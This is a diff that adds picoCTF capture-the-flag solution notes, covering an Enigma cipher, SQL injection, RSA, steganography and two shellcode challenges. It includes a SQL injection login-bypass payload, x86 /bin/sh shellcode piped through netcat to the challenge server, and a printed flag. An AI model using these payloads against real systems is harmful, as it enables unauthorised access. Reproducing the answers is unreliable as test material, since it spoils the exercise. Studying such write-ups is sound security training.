@@ -1,0 +1,97 @@
+Pico CTF Solutions
+---level 2------
+misc:Mystery Box
+**clue*
+	Geheimnis: PXQQ TAMY YDBC WGYE LVN
+	Umkehrwalze: B
+	Grundstellung: PPP
+	Ringstellung: LOG
+	Steckerbrett: G-L, H-F
+
+**Google Translate
+	Secret: PXQQ TAMY YDBC WGYE LVN
+	Reverse roller: B
+	Basic position: PPP
+	Ring position: LOG
+	Plug board: G-L, H-F
+**Enigma Emulator
+	http://enigma.louisedade.co.uk/enigma.html
+Message: QUITEPUZZLINGINDEED
+
+---------------
+web:My First SQL
+try username='
+	select * from users where user=''' and pass='';
+quotes around input
+in password try:{ 0' OR '1'='1 }
+	select * from users wheer user='' and pass='0' OR '1'='1'
+Flag:be_careful_what_you_let_people_ask_104d9ea430b41fb4c5560eecc0652111
+
+------------------------
+Crypto: Sorandom
+This problem is solved by discovering that the python random function uses the mersenne prime  number algorithm.
+This algorithm produces a very long but repeating pattern, such that for any seed number the pattern will be the same.
+For this problem the random.seed value is specified. All that is required is to workout howmany times the randome function is called
+then reverse the computatations on the scrambled flag.
+
+-----------------------
+Crypto: leacked hashes
+Simply google the hashes in the file.
+
+-----------------------
+Forensics: Meta Find Me
+Easiest solved by using strings on linux. (strings image.jpg)
+This gets you the text of the flag.
+Then open the image in the program which is able to read the metadata. This gets the Longitude and latitude
+
+-------------------------
+Little school bus
+The image is a bmp file. look up the format on wikipedia.
+the 4 bytes at address 10 (0xA) contain the address for the start of the pixel data, but they are little endian.
+having found the location of the pixel data, use a script that reads the least significant bit of each byte.
+you dont need to convert big endian to little endian in this case.
+
+---------------------
+A thing called the stack
+pushing onto the stack increments the stack pointer
+read a tutorial on assembly code
+
+---------------------
+Wierd RSA
+This problem intends for you to use the chinese remainder theorum to decrypt the ciphertext
+RSA uses modular arithmetic. 
+You need a modular multiply function, a modular exponentian functoin, and the modular inverse function.
+Helpful reading:
+#http://www.algorithmist.com/index.php/Modular_inverse
+#https://en.wikipedia.org/wiki/Euclidean_algorithm
+#https://en.wikipedia.org/wiki/RSA_(cryptosystem)
+After calcuating the message as a number, you need to convert it to text.
+convert the decimal number to hex. break the hex into pairs and convert those pairs to ascii characters
+
+----------------------------
+shellz
+This problem is looking you to supply raw bytes of executable data to open a shell in order to lauch shell commands to access th flag file. The shell code needsto be  piped to the program.
+ShellCode:
+\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80
+using python..
+(python  -c "print '<shellcode here>'"; cat - )|nc shell2017.picoctf.com 6942
+
+--------------------------
+shells
+This problem should have been done before shellz.
+The program has a function call 'win' which you are trying to call.
+Analysing the source code you can determine that the program asks you for input which is stored in a buffer.
+the program then declares a function pointer and makes it point to the buffer.
+Thus when the function is call it effectively calls the buffer (containing your input) as if it were a functon and executes it.
+Therefore you need to put raw bytes(opcode) into the buffer that will call the win function.
+This program asks for 10 bytes or less. You can either look through the opcode reference (http://ref.x86asm.net) or use the 'rasm2' assembler to generate the opcode from the assembly.
+1) use 'objdump -d' on the downloaded executable to show the the file addresses hex and dissassembly.
+2) you need a command that will jump code execution to the win function. You can use 'call', 'jmp' or 'ret'.  Both 'call' and 'jmp' use relative addressing and hard to calculate. 'ret' uses absolute addressing obtainable from 'objdump'
+3)'ret' returns execution to the last address pushed onto the stack.
+4)therefore the address of the win function must be pushed onto the stack before you can return to it
+5)the required assembly code is: 'push <address of `win`>; ret'
+6)note the semicolon to indicate the end of line.
+7) the rasm2 assemble: rasm2 -a x86 -b 32 'push 0x08048540; ret'
+8) the bytes are \x68\x40\x85\x04\x08\xc3
+8) note the bytes is little endian ordering. the -O flag can be used with rasm to generate raw output which can be piped to netcat.
+
